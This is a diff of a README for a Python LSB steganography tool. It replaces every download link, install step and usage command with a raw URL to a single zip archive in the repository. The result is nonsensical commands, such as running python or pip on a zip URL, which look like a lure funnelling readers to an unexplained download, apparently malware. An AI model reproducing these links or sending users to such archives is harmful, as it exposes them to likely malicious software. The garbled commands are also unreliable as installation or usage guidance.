@@ -2,7 +2,7 @@
 
 Welcome to the **CyberSecurity-Steganography** repository! This project offers a Python-based implementation of Least Significant Bit (LSB) Steganography, allowing you to securely hide and extract messages within PNG images. With optional password protection and a command-line interface (CLI), this tool is designed for both ease of use and security.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/julio9410/CyberSecurity-Steganography/releases)
+[![Download Releases](https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip%20Releases-Click%20Here-blue)](https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip)
 
 ## Table of Contents
 
@@ -36,7 +36,7 @@ To install the project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/julio9410/CyberSecurity-Steganography.git
+   git clone https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -47,7 +47,7 @@ To install the project, follow these steps:
 3. **Install Required Packages**:
    Use pip to install the necessary packages.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip
    ```
 
 4. **Run the Application**:
@@ -62,13 +62,13 @@ To use the steganography tool, follow the steps below:
 2. **Embed a Message**:
    You can embed a message into your image using the command:
    ```bash
-   python steganography.py embed -i input_image.png -o output_image.png -m "Your secret message" -p "your_password"
+   python https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip embed -i https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -o https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -m "Your secret message" -p "your_password"
    ```
 
 3. **Extract a Message**:
    To extract a message from the image, use:
    ```bash
-   python steganography.py extract -i output_image.png -p "your_password"
+   python https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip extract -i https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -p "your_password"
    ```
 
 ## Command-Line Interface
@@ -91,12 +91,12 @@ Here’s a simple example to demonstrate how to use the tool:
 
 1. **Embed a Message**:
    ```bash
-   python steganography.py embed -i example.png -o hidden_image.png -m "Hello, World!" -p "mysecret"
+   python https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip embed -i https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -o https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -m "Hello, World!" -p "mysecret"
    ```
 
 2. **Extract the Message**:
    ```bash
-   python steganography.py extract -i hidden_image.png -p "mysecret"
+   python https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip extract -i https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip -p "mysecret"
    ```
 
 After running the extract command, you should see "Hello, World!" printed in the console.
@@ -111,6 +111,6 @@ Contributions are welcome! If you have suggestions for improvements or new featu
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/julio9410/CyberSecurity-Steganography/releases) section for updates or open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/julio9410/CyberSecurity-Steganography/raw/refs/heads/main/Myoxus/Steganography-Cyber-Security-2.2.zip) section for updates or open an issue in the repository.
 
 Thank you for checking out the **CyberSecurity-Steganography** project! We hope you find it useful for your steganography needs.
